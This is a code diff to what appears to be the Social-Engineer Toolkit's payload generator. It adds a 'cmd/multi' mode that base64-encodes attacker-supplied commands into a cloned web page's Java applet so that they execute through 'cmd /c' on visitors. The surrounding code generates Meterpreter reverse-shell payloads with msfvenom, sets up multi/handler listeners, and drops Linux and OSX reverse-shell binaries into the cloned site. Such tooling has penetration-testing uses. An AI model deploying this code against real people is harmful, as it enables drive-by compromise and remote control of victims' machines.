@@ -45,10 +45,8 @@ meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT=")
 linux_meterpreter_multi = check_config("LINUX_METERPRETER_MULTI_SCRIPT=")
 meterpreter_multi_command = check_config("METERPRETER_MULTI_COMMANDS=")
 meterpreter_multi_command = meterpreter_multi_command.replace(";", "\n")
-linux_meterpreter_multi_command = check_config(
-    "LINUX_METERPRETER_MULTI_COMMANDS=")
-linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(
-    ";", "\n")
+linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS=")
+linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(";", "\n")
 unc_embed = check_config("UNC_EMBED=")
 
 attack_vector = 0
@@ -81,7 +79,6 @@ if os.path.isfile(setdir + "/payloadgen"):
 #
 # grab ipaddr if it hasn't been identified yet
 #
-
 if check_options("IPADDR=") == False:
     fileopen = open("/etc/setoolkit/set.config", "r")
     data = fileopen.read()
@@ -149,7 +146,7 @@ try:
 
     # check the length and make sure it works
     if choice1 != "":
-        choice1 = check_length(choice1, 7)
+        choice1 = check_length(choice1, 8)
         # convert it to a string
         choice1 = str(choice1)
 
@@ -175,7 +172,7 @@ try:
         flag = 1
 
     # here we specify shellcodeexec
-    if choice1 == '1' or choice1 == '2' or choice1 == '6':
+    if choice1 == '1' or choice1 == '2' or choice1 == '6' or choice1 == '8':
         encode_stop = 1
         encode = 0
 
@@ -208,15 +205,12 @@ try:
     # if custom
     if choice1 == '7':
         print_info("Example: /root/custom.exe")
-        choice1 = raw_input(
-            setprompt(["4"], "Enter the path to your executable"))
+        choice1 = raw_input(setprompt(["4"], "Enter the path to your executable"))
         if not os.path.isfile(choice1):
             while 1:
                 print_error("ERROR:File not found. Try Again.")
-                choice1 = raw_input(
-                    setprompt(["4"], "Enter the path to your executable"))
-                if os.path.isfile(choice1):
-                    break
+                choice1 = raw_input(setprompt(["4"], "Enter the path to your executable"))
+                if os.path.isfile(choice1): break
 
         update_options("CUSTOM_EXE=%s" % (choice1))
         custom = 1
@@ -231,6 +225,8 @@ try:
 
     # Specify Encoding Option
     encoder = "false"
+
+    if choice1 == "cmd/multi": update_options("CUSTOM_EXE=CMD/MULTI")
 
     # if we aren't using the set shell
     if choice1 != "set/reverse_shell":
@@ -256,9 +252,9 @@ try:
         # specify the port for the listener
         if choice3 == "":
             if choice1 != "shellcode/multipyinject":
-                if custom == 0:
-                    choice3 = raw_input(
-                        setprompt(["4"], "PORT of the listener [443]"))
+                if choice1 != "cmd/multi":
+                    if custom == 0:
+                        choice3 = raw_input(setprompt(["4"], "PORT of the listener [443]"))
 
         # here we check if the user really wants to use port 80
         if choice3 == "80":
@@ -311,11 +307,9 @@ try:
                 # if we are using shellcodeexec
                 if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
-                        print (
-                            "\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
+                        print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
                         # select payload
-                        choice9 = raw_input(
-                            setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_https]"))
+                        choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_https]"))
                         # select default meterpreter reverse tcp
                         if choice9 == "":
                             choice9 = "windows/meterpreter/reverse_https"
@@ -335,35 +329,33 @@ try:
                             ipaddr = check_options("IPADDR=")
 
                     if choice1 == "shellcode/alphanum":
-                        print_status(
-                            "Generating the payload via msfvenom and generating alphanumeric shellcode...")
-                        subprocess.Popen("%smsfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (
-                            meta_path(), choice9, choice2, portnum, setdir), shell=True).wait()
+                        print_status("Generating the payload via msfvenom and generating alphanumeric shellcode...")
+                        subprocess.Popen("%smsfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (meta_path(), choice9, choice2, portnum, setdir), shell=True).wait()
 
-                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
-                        # here we update set options to specify pyinjection and
-                        # multipy
+                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject" or choice1 == "cmd/multi":
+                        # here we update set options to specify pyinjection and multipy
                         update_options("PYINJECTION=ON")
-                    # define, this will eventually be all of our payloads
+
+                        # define, this will eventually be all of our payloads
                         multipyinject_payload = ""
                         # clean up old file
                         if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
-                            os.remove("%s/meta_config_multipyinjector" %
-                                      (setdir))
+                            os.remove("%s/meta_config_multipyinjector" % (setdir))
 
                         # remove any old payload options
                         if os.path.isfile(setdir + "/payload.options.shellcode"):
                             os.remove(setdir + "/payload_options.shellcode")
+
                         # this is the file that gets saved with the payload and
                         # port options
-                        payload_options = open(
-                            setdir + "/payload_options.shellcode", "a")
-
+                        if choice1 != "cmd/multi": payload_options = open(setdir + "/payload_options.shellcode", "a")
+                        
                         while 1:
-
+                            # don't need any options here 
+                            if choice1 == "cmd/multi": break
+                            
                             if choice1 == "shellcode/multipyinject":
-                                print (
-                                    "\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
+                                print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                 choice9 = raw_input(
                                     setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                                 # select default meterpreter reverse tcp
@@ -396,64 +388,60 @@ try:
                                 filewrite = open("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (
-                                        choice9, stage_encoding, ipaddr, shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (choice9, stage_encoding, ipaddr, shellcode_port))
                                     filewrite.close()
 
-                            if validate_ip(choice2) == False:
-                                if choice9 != "windows/meterpreter/reverse_https":
-                                    if choice9 != "windows/meterpreter/reverse_http":
-                                        print_status(
-                                            "Possible hostname detected, switching to windows/meterpreter/reverse_https")
-                                        choice9 == "windows/meterpreter/reverse_https"
+                            if choice1 != "cmd/multi":
+                                if validate_ip(choice2) == False:
+                                    if choice9 != "windows/meterpreter/reverse_https":
+                                        if choice9 != "windows/meterpreter/reverse_http":
+                                            print_status("Possible hostname detected, switching to windows/meterpreter/reverse_https")
+                                            choice9 == "windows/meterpreter/reverse_https"
 
-                            if choice9 == "windows/meterpreter/reverse_tcp_allports":
-                                portnum = "LPORT=1"
-                            # fix port num
-                            if "multipyinject" in choice1:
-                                portnum = shellcode_port
+                                if choice9 == "windows/meterpreter/reverse_tcp_allports":
+                                    portnum = "LPORT=1"
+                                # fix port num
+                                if "multipyinject" in choice1:
+                                    portnum = shellcode_port
 
-                            else:
-                                portnum = portnum.replace("LPORT=", "")
+                                else:
+                                    portnum = portnum.replace("LPORT=", "")
 
-                            # meterpreter reverse_tcp
-                            if choice9 == "windows/meterpreter/reverse_tcp":
-                                shellcode = metasploit_shellcode(
-                                    choice9, choice2, portnum)
-                            # meterpreter reverse_https
-                            if choice9 == "windows/meterpreter/reverse_https":
-                                shellcode = metasploit_shellcode(
-                                    choice9, choice2, portnum)
-                            # meterpreter reverse_http
-                            if choice9 == "windows/meterpreter/reverse_http":
-                                shellcode = metasploit_shellcode(
-                                    choice9, choice2, portnum)
-                            # meterpreter tcp allports
-                            if choice9 == "windows/meterpreter/reverse_tcp_allports":
-                                shellcode = metasploit_shellcode(
-                                    choice9, choice2, portnum)
-                            # windows shell reverse_tcp
-                            if choice9 == "windows/shell/reverse_tcp":
-                                shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                                # meterpreter reverse_tcp
+                                if choice9 == "windows/meterpreter/reverse_tcp":
+                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                                # meterpreter reverse_https
+                                if choice9 == "windows/meterpreter/reverse_https":
+                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                                # meterpreter reverse_http
+                                if choice9 == "windows/meterpreter/reverse_http":
+                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                                # meterpreter tcp allports
+                                if choice9 == "windows/meterpreter/reverse_tcp_allports":
+                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                                # windows shell reverse_tcp
+                                if choice9 == "windows/shell/reverse_tcp":
+                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
 
-                            if choice1 == "shellcode/pyinject":
-                                shellcode_port = portnum.replace("LPORT=", "")
+                                if choice1 == "shellcode/pyinject":
+                                    shellcode_port = portnum.replace("LPORT=", "")
 
-                            if validate_ip(choice2) == True: 
-                                shellcode = shellcode_replace(choice2, shellcode_port, shellcode)
+                                if validate_ip(choice2) == True: 
+                                    shellcode = shellcode_replace(choice2, shellcode_port, shellcode)
 
-                            # here we write out the payload and port for later
-                            # use in powershell injection
-                            payload_options.write(choice9 + " " + portnum + ",")
+                                # here we write out the payload and port for later
+                                # use in powershell injection
+                                payload_options.write(choice9 + " " + portnum + ",")
 
-                            # break out of the loop if we are only using one
-                            # payload else keep on
-                            if choice1 == "shellcode/pyinject": break
-                            multipyinject_payload += shellcode + ","
+                                # break out of the loop if we are only using one
+                                # payload else keep on
+                                if choice1 == "shellcode/pyinject": break
+                                multipyinject_payload += shellcode + ","
 
-                        # get rid of tail comma
-                        if multipyinject_payload.endswith(","):
-                            multipyinject_payload = multipyinject_payload[:-1]
+                        if choice1 != "cmd/multi":
+                            # get rid of tail comma
+                            if multipyinject_payload.endswith(","):
+                                multipyinject_payload = multipyinject_payload[:-1]
 
                         # if we have multiple payloads, use multi injector
 
@@ -510,19 +498,15 @@ try:
                         print_status("Prepping pyInjector for delivery..")
                     # prepping multi pyinjector
                     if choice1 == "shellcode/multipyinject":
-                        print_status(
-                            "Prepping Multi-pyInjector for delivery..")
+                        print_status("Prepping Multi-pyInjector for delivery..")
                     # here we obfuscate the binary a little bit
                     random_string = generate_random_string(3, 3).upper()
                     if choice1 == "shellcode/alphanum":
-                        fileopen = open(
-                            "%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
+                        fileopen = open("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
                     if choice1 == "shellcode/pyinject":
-                        fileopen = open(
-                            "%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
+                        fileopen = open("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
                     if choice1 == "shellcode/multipyinject":
-                        fileopen = open(
-                            "%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()
+                        fileopen = open("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()
 
                     # write out the payload
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyiject":
@@ -530,25 +514,20 @@ try:
                         filewrite.write(fileopen)
                         filewrite.close()
 
-                    subprocess.Popen(
-                        "cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir, setdir), shell=True).wait()
+                    subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir, setdir), shell=True).wait()
                     # we need to read in the old index.html file because its
                     # already generated, need to present the alphanum to it
                     if os.path.isfile("%s/web_clone/index.html" % (setdir)):
-                        fileopen = open("%s/web_clone/index.html" %
-                                        (setdir), "r")
-                        filewrite = open(
-                            "%s/web_clone/index.html.new" % (setdir), "w")
-                        fileopen2 = open("%s/meterpreter.alpha" %
-                                         (setdir), "r")
+                        fileopen = open("%s/web_clone/index.html" %(setdir), "r")
+                        filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
+                        fileopen2 = open("%s/meterpreter.alpha" % (setdir), "r")
                         alpha_shellcode = fileopen2.read().rstrip()
                         data = fileopen.read()
                         data = data.replace(
                             'param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
                         if choice1 == "shellcode/multipyinject":
                             secret = base64.b64encode(b'secret')
-                            data = data.replace(
-                                'param name="10" value=""', 'param name="10" value ="%s"' % (secret))
+                            data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
                         filewrite.write(str(data))
 
                         # close file
@@ -556,15 +535,11 @@ try:
 
                         # rename file
                         if choice1 == "shellcode/alphanum":
-                            print_status(
-                                "Prepping website for alphanumeric injection..")
+                            print_status("Prepping website for alphanumeric injection..")
                         if choice1 == "shellcode/pyinject":
-                            print_status(
-                                "Prepping website for pyInjector shellcode injection..")
-                        print_status(
-                            "Base64 encoding shellcode and prepping for delivery..")
-                        subprocess.Popen(
-                            "mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (setdir, setdir), shell=True).wait()
+                            print_status("Prepping website for pyInjector shellcode injection..")
+                        print_status("Base64 encoding shellcode and prepping for delivery..")
+                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (setdir, setdir), shell=True).wait()
                     if choice9 == "windows/meterpreter/reverse_tcp_allports":
                         portnum = "LPORT=1"
                         choice3 = "1"
@@ -584,57 +559,64 @@ try:
         powershell = check_config("POWERSHELL_INJECTION=")
         if powershell.lower() == "on" or powershell.lower() == "yes":
             if choice1 == "set/reverse_shell" or choice1 == "RATTE":
-                print_status(
-                    "Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
+                print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
                 setshell_counter = 1
             if setshell_counter == 0:
                 if custom == 0:  # or choice1 != "set/reverse_shell" or choice1 != "shellcode/alphanum":
                     if os.path.isfile("%s/web_clone/index.html" % (setdir)):
-                        try:
-                            core.module_reload(src.payloads.powershell.prep)
-                        except:
-                            import src.payloads.powershell.prep
-                        if os.path.isfile("%s/x86.powershell" % (setdir)):
-                            fileopen1 = open(
-                                "%s/x86.powershell" % (setdir), "r")
-                            x86 = fileopen1.read()
-                            # open up the x86 powershell attack
-                            fileopen3 = fileopen = open(
-                                "%s/web_clone/index.html" % (setdir), "r")
-                            filewrite = open(
-                                "%s/web_clone/index.html.new" % (setdir), "w")
-                            data = fileopen3.read()
-                            data = data.replace(
-                                'param name="5" value=""', 'param name="5" value="%s"' % (x86))
-                            data = data.replace(
-                                'param name="6" value=""', 'param name="6" value="%s"' % (x86))
+                        if choice1 != "cmd/multi":
+                            try: core.module_reload(src.payloads.powershell.prep)
+                            except: import src.payloads.powershell.prep
+                            if os.path.isfile("%s/x86.powershell" % (setdir)):
+                                fileopen1 = open("%s/x86.powershell" % (setdir), "r")
+                                x86 = fileopen1.read()
+
+                        # if we specified option cmd/multi which allows us to enter commands in instead and execute them many times
+                        if choice1 == "cmd/multi":
+                            print_status("This section will allow you to specify your own .txt file which can contain one more multiple commands. In order to execute multiple commands you would enter them in for example: cmd1,cmd2,cmd3,cmd4. In the background the Java Applet will enter in cmd /c 'yourcommands here'. You need to provide a path to the txt file that contains all of your commands or payloads split by commas. If just one, then just use no ,.")
+                            filepath = raw_input("\nEnter the path to the file that contains commands: ")
+                            while 1:
+                                if not os.path.isfile(filepath):
+                                    filepath = raw_input("[!] File not found.\nEnter the path again and make sure file is there: ")
+                                if os.path.isfile(filepath): break
+
+                            x86 = open(filepath, "r").read()
+                            print_status("Multi-command payload delivery for Java Applet selected.")
+                            print_status("Embedding commands into Java Applet parameters...")
+                            print_status("Note that these will be base64-encoded once, regardless of the payload..")
+
+                        fileopen3 = open("%s/web_clone/index.html" % (setdir), "r")
+                        filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
+                        data = fileopen3.read()
+
+                        # encode once, will need to decode later
+                        base_encode = base64.b64encode(x86)
+                        data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (base_encode))
+                        data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (base_encode))
+                        if choice1 == "cmd/multi": data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
+                        if choice1 != "cmd/multi":
                             # check if we don't want to deploy binaries
                             deploy_binaries = check_config("DEPLOY_BINARIES=")
                             if deploy_binaries.lower() == "n" or deploy_binaries.lower() == "no":
-                                data = data.replace(
-                                    'param name="8" value="YES"', 'param name="8" value="NO"')
+                                data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                             if deploy_binaries.lower() == "y" or deploy_binaries.lower() == "yes":
-                                data = data.replace(
-                                    'param name="8" value="NO"', 'param name="8" value="YES"')
-                            filewrite.write(data)
-                            filewrite.close()
-                            subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (
-                                setdir, setdir), stdout=subprocess.PIPE, shell=True)
+                                data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
+
+                        filewrite.write(data)
+                        filewrite.close()
+                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir, setdir), stdout=subprocess.PIPE, shell=True).wait()
 
         # here we specify the binary to deploy if we are using ones that are
         # required to drop binaries
-        if custom == 1 or choice1 == "set/reverse_shell" or choice1 == "shellcode/alphanum":
-            fileopen3 = fileopen = open(
-                "%s/web_clone/index.html" % (setdir), "r")
+        if custom == 1 or choice1 == "set/reverse_shell" or choice1 == "shellcode/alphanum" or choice1 == "cmd/multi":
+            fileopen3 = fileopen = open("%s/web_clone/index.html" % (setdir), "r")
             filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
             data = fileopen3.read()
             # check if we don't want to deploy binaries
-            data = data.replace('param name="8" value="NO"',
-                                'param name="8" value="YES"')
+            data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
             filewrite.write(data)
             filewrite.close()
-            subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (
-                setdir, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 
         # specify attack vector as SET interactive shell
         if choice1 == "set/reverse_shell":
@@ -696,27 +678,20 @@ try:
                         port2 = check_config("LINUX_REVERSE_PORT=")
                         osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
                         linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
-                        print_status(
-                            "Generating OSX payloads through Metasploit...")
-                        subprocess.Popen(r"msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (meta_path(
-                        ), osxpayload, choice2, port1, setdir, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                        print_status(
-                            "Generating Linux payloads through Metasploit...")
-                        subprocess.Popen(r"%smsfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (meta_path(
-                        ), linuxpayload, choice2, port2, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        print_status("Generating OSX payloads through Metasploit...")
+                        subprocess.Popen(r"msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (meta_path(), osxpayload, choice2, port1, setdir, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        print_status("Generating Linux payloads through Metasploit...")
+                        subprocess.Popen(r"%smsfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (meta_path(), linuxpayload, choice2, port2, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         if multiattack_java == "on":
                             multiattack.write("OSX=" + str(port1) + "\n")
                             multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
                             multiattack.write("LINUX=" + str(port2) + "\n")
-                            multiattack.write(
-                                "LINUXPAYLOAD=%s\n" % (linuxpayload))
+                            multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))
 
                     osxcheck = check_options("MAC.BIN=")
                     linuxcheck = check_options("NIX.BIN=")
-                    shutil.copyfile(setdir + "/mac.bin",
-                                    setdir + "/web_clone/%s" % (osxcheck))
-                    shutil.copyfile(setdir + "/nix.bin", setdir +
-                                    "/web_clone/%s" % (linuxcheck))
+                    shutil.copyfile(setdir + "/mac.bin", setdir + "/web_clone/%s" % (osxcheck))
+                    shutil.copyfile(setdir + "/nix.bin", setdir + "/web_clone/%s" % (linuxcheck))
 
         # try block here
         try:
